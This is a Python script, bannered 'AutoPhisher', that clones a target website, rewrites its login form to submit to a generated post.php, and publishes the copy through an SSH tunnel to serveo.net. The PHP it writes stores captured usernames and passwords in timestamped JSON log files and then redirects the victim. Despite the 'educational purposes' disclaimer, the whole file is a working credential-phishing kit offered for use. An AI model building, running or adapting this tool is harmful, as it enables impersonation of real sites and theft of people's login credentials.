import requests
import os
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
import webbrowser
import random
from colorama import init, Fore
import json
import uuid
import time
import colorsys
import subprocess

def get_random_color():
    t = time.time() % 10
    r, g, b = [int(255*x) for x in colorsys.hsv_to_rgb(t / 10, 1.0, 1.0)]
    return f'{r};{g};{b}'

def print_colored_text(text):
    color_code = get_random_color()
    colored_text = f"\033[38;2;{color_code}m{text}\033[0m"
    print(colored_text)

def create_website_clone():
    print_welcome_message()
    print_instructions()

    print_colored_text("Enter the URL of the website you want to clone: ")
    url = input()
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise exception if status code is not 200
    except requests.exceptions.RequestException as err:
        print_colored_text(f"An error occurred while fetching the website: {err}")
        return

    # Create a folder with the website name
    website_name = urlparse(url).netloc
    os.makedirs(website_name, exist_ok=True)
    logs_folder = os.path.join(website_name, "logs")
    os.makedirs(logs_folder, exist_ok=True)

    # Save the HTML content of the website
    html_content = response.content
    with open(f"{website_name}/index.html", "wb") as f:
        try:
            f.write(html_content)
        except IOError as err:
            print_colored_text(f"An error occurred while saving the HTML file: {err}")

    # Parse the HTML content and retrieve necessary resources
    soup = BeautifulSoup(html_content, "html.parser")
    resource_tags = soup.find_all(["link", "script", "img", "a"])

    total_resources = len(resource_tags)
    current_resource = 0

    for tag in resource_tags:
        if tag.name == "a":
            update_internal_links(tag, website_name)
        elif tag.has_attr("href"):
            resource_url = urljoin(url, tag["href"])
            if not validate_resource(resource_url):
                continue
            save_resource(website_name, resource_url)
        elif tag.has_attr("src"):
            resource_url = urljoin(url, tag["src"])
            if not validate_resource(resource_url):
                continue
            save_resource(website_name, resource_url)

        current_resource += 1
        progress = (current_resource / total_resources) * 100
        print_progress(progress)
        print(f"Progress: {current_resource}/{total_resources} resources downloaded.", end="\r", flush=True)

    print()
    print_colored_text("Website clone created successfully.")

    # Disable hyperlinks
    disable_hyperlinks(soup)

    # Search for the form and add the post.php file
    form_tags = soup.find_all("form")
    if form_tags:
        add_post_php(website_name, form_tags[0])

    # Save the modified HTML content
    modified_html = soup.prettify()
    with open(f"{website_name}/index.html", "wb") as f:
        try:
            f.write(modified_html.encode("utf-8"))
        except IOError as err:
            print_colored_text(f"An error occurred while saving the modified HTML file: {err}")

    # Open the cloned website in a browser
    cloned_site_path = os.path.abspath(website_name)
    webbrowser.open(f"file://{cloned_site_path}/index.html")

    # Publish the cloned website using serveo.net
    publish_with_serveo(website_name)


def validate_resource(resource_url):
    try:
        response = requests.head(resource_url)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False


def save_resource(website_name, resource_url):
    try:
        response = requests.get(resource_url)
        response.raise_for_status()  # Raise exception if status code is not 200
    except requests.exceptions.RequestException as err:
        print_colored_text(f"An error occurred while fetching a resource: {err}")
        return

    if response.status_code == 404:
        print_colored_text(f"Skipping resource - 404 error: {resource_url}")
        return

    filename = urlparse(resource_url).path.split("/")[-1]
    try:
        with open(f"{website_name}/{filename}", "wb") as f:
            f.write(response.content)
    except IOError as err:
        print_colored_text(f"An error occurred while saving a resource: {err}")


def print_progress(progress):
    filled_length = int(50 * progress / 100)
    empty_length = 50 - filled_length
    bar = f"{Fore.GREEN}█" * filled_length + f"{Fore.BLACK}█" * empty_length + Fore.RESET
    print(f"\rProgress: |{bar} | {progress:.2f}% ", end="", flush=True)


def disable_hyperlinks(soup):
    for a_tag in soup.find_all("a"):
        a_tag["href"] = "#"
        a_tag["onclick"] = "return false;"


def update_internal_links(tag, website_name):
    if tag.has_attr("href"):
        href = tag["href"]
        parsed_href = urlparse(href)
        if parsed_href.netloc == "":
            updated_href = urljoin(website_name, href)
            tag["href"] = updated_href


def add_post_php(website_name, form_tag):
    action = "post.php"
    method = input("Enter the method for the post.php file (GET/POST): ")
    redirect_url = input("Enter the URL to redirect after capturing the data: ")
    form_tag["action"] = action
    form_tag["method"] = method

    num_fields = int(input("Enter number of fields: "))
    field_names = [input(f"Enter field name {i + 1}: ") for i in range(num_fields)]

    session_id = str(uuid.uuid4())

    post_php_content = f"""
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {{
    $usuario = $_POST['{field_names[0]}'];
    $password = $_POST['{field_names[1]}'];

    // Realiza alguna operación con los valores capturados
    // Por ejemplo, muestra los valores en la página
    // echo "Valor de usuario: " . $usuario;
    // echo "Valor de password: " . $password;

    // Guarda los datos en un archivo JSON
    $data = array(
        'usuario' => $usuario,
        'password' => $password
    );
    $logs_folder = '{os.path.join("logs")}';
    if (!is_dir($logs_folder)) {{
        mkdir($logs_folder);
    }}

    // Genera un nombre de archivo único basado en la fecha y hora actual
    $timestamp = date("Y-m-d_H-i-s");
    $log_filename = $logs_folder . "/data_$timestamp.json";

    // Guarda los datos en un archivo JSON
    file_put_contents($log_filename, json_encode($data));

    // Redirige a la URL especificada
    header("Location: {redirect_url}");
    exit();
}}
?>
"""

    with open(f"{website_name}/{action}", "w") as f:
        f.write(post_php_content)

def check_serveo_status():
    serveo_process = subprocess.Popen(["ssh", "serveo.net"], stdout=subprocess.PIPE)
    serveo_output = serveo_process.stdout.read().decode().strip()
    print(serveo_output)

def publish_with_serveo(website_name):
    serveo_process = subprocess.Popen(["ssh", "-o", "StrictHostKeyChecking=no", "-R", "80:localhost:80", "serveo.net"], stdout=subprocess.PIPE)
    print()
    print_colored_text("Publishing the cloned website with serveo.net...")
    time.sleep(5)  # Wait for the SSH tunnel to establish

    serveo_output = serveo_process.stdout.readline().decode().strip()
    serveo_url = serveo_output.split(" ")[-1]

    print()
    print_colored_text("Your cloned website is published and can be accessed at:")
    print(f"{Fore.GREEN}{serveo_url}/Pruebas/{website_name}/{Fore.RESET}")

def print_welcome_message():
    welcome_message = """
 ▄▄▄      █    ██▄▄▄█████▓▒█████  ██▓███  ██░ ██ ██▓ ██████ ██░ ██▓█████ ██▀███  
▒████▄    ██  ▓██▓  ██▒ ▓▒██▒  ██▓██░  ██▓██░ ██▓██▒██    ▒▓██░ ██▓█   ▀▓██ ▒ ██▒
▒██  ▀█▄ ▓██  ▒██▒ ▓██░ ▒▒██░  ██▓██░ ██▓▒██▀▀██▒██░ ▓██▄  ▒██▀▀██▒███  ▓██ ░▄█ ▒
░██▄▄▄▄██▓▓█  ░██░ ▓██▓ ░▒██   ██▒██▄█▓▒ ░▓█ ░██░██░ ▒   ██░▓█ ░██▒▓█  ▄▒██▀▀█▄  
 ▓█   ▓██▒▒█████▓  ▒██▒ ░░ ████▓▒▒██▒ ░  ░▓█▒░██░██▒██████▒░▓█▒░██░▒████░██▓ ▒██▒
 ▒▒   ▓▒█░▒▓▒ ▒ ▒  ▒ ░░  ░ ▒░▒░▒░▒▓▒░ ░  ░▒ ░░▒░░▓ ▒ ▒▓▒ ▒ ░▒ ░░▒░░░ ▒░ ░ ▒▓ ░▒▓░
  ▒   ▒▒ ░░▒░ ░ ░    ░     ░ ▒ ▒░░▒ ░     ▒ ░▒░ ░▒ ░ ░▒  ░ ░▒ ░▒░ ░░ ░  ░ ░▒ ░ ▒░
  ░   ▒   ░░░ ░ ░  ░     ░ ░ ░ ▒ ░░       ░  ░░ ░▒ ░  ░  ░  ░  ░░ ░  ░    ░░   ░ 
      ░  ░  ░                ░ ░          ░  ░  ░░       ░  ░  ░  ░  ░  ░  ░     
                                                                 [ By BenoX 2023 ]                                                                       
    """
    print_colored_text(welcome_message)


def print_instructions():
    instructions = """
    Welcome to the Website Cloner!

    This script allows you to clone a website by providing its URL. It will download the HTML 
    content and all necessary resources such as CSS, JavaScript, images, and other linked files. 
    The cloned website will be saved in a folder with the website's name.

    Instructions:
    1. Enter the URL of the website you want to clone.
    2. Wait for the cloning process to complete.
    3. The cloned website will open in your default web browser.

    Let's get started!

    🤖 Warning:

     Disclaimer: This script is for educational and learning purposes only.
     Improper or unauthorized use of this script to clone websites without the permission of the
     website owner is illegal. The author [BenoX] are not responsible for any
     misuse or damage caused by the use of this script.

     Benox 2023 ®

    """
    print(instructions)


# Entry point
if __name__ == "__main__":
    init(autoreset=True)
    create_website_clone()

